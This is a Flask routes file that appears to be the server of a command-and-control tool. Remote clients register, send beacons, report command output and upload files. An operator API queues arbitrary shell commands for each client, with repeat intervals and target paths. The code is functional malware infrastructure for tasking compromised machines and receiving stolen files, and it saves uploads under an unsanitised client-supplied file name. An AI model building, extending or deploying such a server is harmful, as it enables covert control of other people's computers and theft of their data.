from flask import Blueprint, request, jsonify
from .models import User, Task, Log
from . import db
from server.services.user_service import register_user
from server.services.beacon_service import BeaconService
import uuid
import os
from server.config import Config
from server.logger import Logger, LogLevel
import json
from datetime import datetime, timedelta

beaconService = BeaconService()

bp = Blueprint("routes", __name__)
@bp.route("/register", methods=["POST"])
def register():
    new_client_registration = False
    
    data = request.json
    username = data.get("username")
    client_id = data.get("client_id")
    op_system = data.get("op_system")
    
    if not client_id:
        client_id = str(uuid.uuid4())
        new_client_registration = True
        
    response = register_user(username, client_id, request.remote_addr, op_system, new_client_registration)
    return jsonify(response)

@bp.route('/beacon', methods=['POST'])
def beacon():
    data = request.json
    client_id = data.get("client_id")
    
    response = beaconService.handle_beacon_request(client_id)
    return jsonify(response)

@bp.route('/report', methods=['POST'])
def report():
    data = request.json
    client_id = data.get("client_id")
    result = data.get("result")
    
    Logger.log(client_id, LogLevel.REPORT.value, json.dumps(result))
    
    print(f"[+] Report from client: {data}")
    response = {"status": "recieved"}
    return jsonify(response)

@bp.route('/upload', methods=['POST'])
def upload():
    file = request.files.get("file")
    data = request.form
    
    client_id = data["client_id"]
    file_name = data["file_name"]
    upl_key = data["fup_key"]
    
    if not BeaconService.verify_otk(client_id, upl_key):
        Logger.log(client_id, LogLevel.ALERT.value, "Client made unverified request to '/upload' endpoint")
        print("[!] Recieved unauthorized call to /upload")
        return
        
    BASE_UPLOAD_PATH = os.path.join(
        Config.get("upload", "base_upload_path"),
        client_id
    )
    
    if os.path.exists(BASE_UPLOAD_PATH):
        if os.path.exists(os.path.join(BASE_UPLOAD_PATH, file_name)) and Config.get("upload", "append_identifier_for_overlapping_names"):
            base_name, extension = os.path.splitext(file_name)
            index = 1
            while True:
                new_file_name = f"{base_name}_{index}{extension}"
                new_path = os.path.join(BASE_UPLOAD_PATH, new_file_name)
                if not os.path.exists(new_path):
                    file_name = new_file_name
                    break
                index += 1
        
        file.save(os.path.join(BASE_UPLOAD_PATH, file_name))
        Logger.log(client_id, LogLevel.INFO.value, f"FUP task complete. File: '{file_name}'")
    else:
        Logger.log(client_id, LogLevel.ERROR.value, "Client FUP directory does not exist")
        print(f"Directory for {client_id} does not exist.")
        
    return jsonify({"status": "SUCCESS"})
        

"""
User Interface API
"""

@bp.route("/api/write-task", methods=["POST"])
def write_task():
    data = request.json
    
    print(data)
    
    client_id = data.get("client_id")
    command = data.get("command")
    command_mode = data.get("command_mode")
    repeat_interval = data.get("repeat_interval")
    run_once = data.get("run_once")
    target_path = data.get("target_path")
    execute = data.get("execute")
    next_execution = datetime.utcnow()
    
    if not client_id or not command or not command_mode:
        return jsonify({"error": "Missing required fields"}), 400
    
    new_task = Task(
        client_id=client_id,
        command=command,
        command_mode=command_mode,
        repeat_interval=repeat_interval,
        run_once=run_once,
        target_path=target_path,
        execute=execute,
        next_execution=next_execution
    )
    
    db.session.add(new_task)
    db.session.commit()
    
    return jsonify({"status": "Task created", "task": {
        "id": new_task.id,
        "client_id": new_task.client_id,
        "command": new_task.command,
        "command_mode": new_task.command_mode,
        "repeat_interval": new_task.repeat_interval,
        "run_once": new_task.run_once,
        "target_path": new_task.target_path,
        "execute": new_task.execute,
        "next_execution": new_task.next_execution.isoformat()
    }}), 201

@bp.route("/api/get-tasks", methods=["GET"])
def get_tasks():
    tasks = Task.query.all()
    task_list = []
    for task in tasks:
        task_data = {
            "id": task.id,
            "client_id": task.client_id,
            "command": task.command,
            "command_mode": task.command_mode,
            "repeat_interval": task.repeat_interval,
            "run_once": task.run_once,
            "next_execution": task.next_execution.isoformat() if task.next_execution else None,
            "target_path": task.target_path,
            "execute": task.execute,
        }
        task_list.append(task_data)
        
    return jsonify(task_list)

@bp.route("/api/delete-task/<int:task_id>", methods=["DELETE"])
def delete_task(task_id):
    task = Task.query.get(task_id)
    if task:
        db.session.delete(task)
        db.session.commit()
        return jsonify({"status": "deleted"})
    return 404

@bp.route("/api/get-logs", methods=["GET"])
def get_logs():
    return ""

@bp.route("/api/get-users", methods=["GET"])
def get_users():
    pass

@bp.route("/api/get-reports", methods=["GET"])
def get_reports():
    pass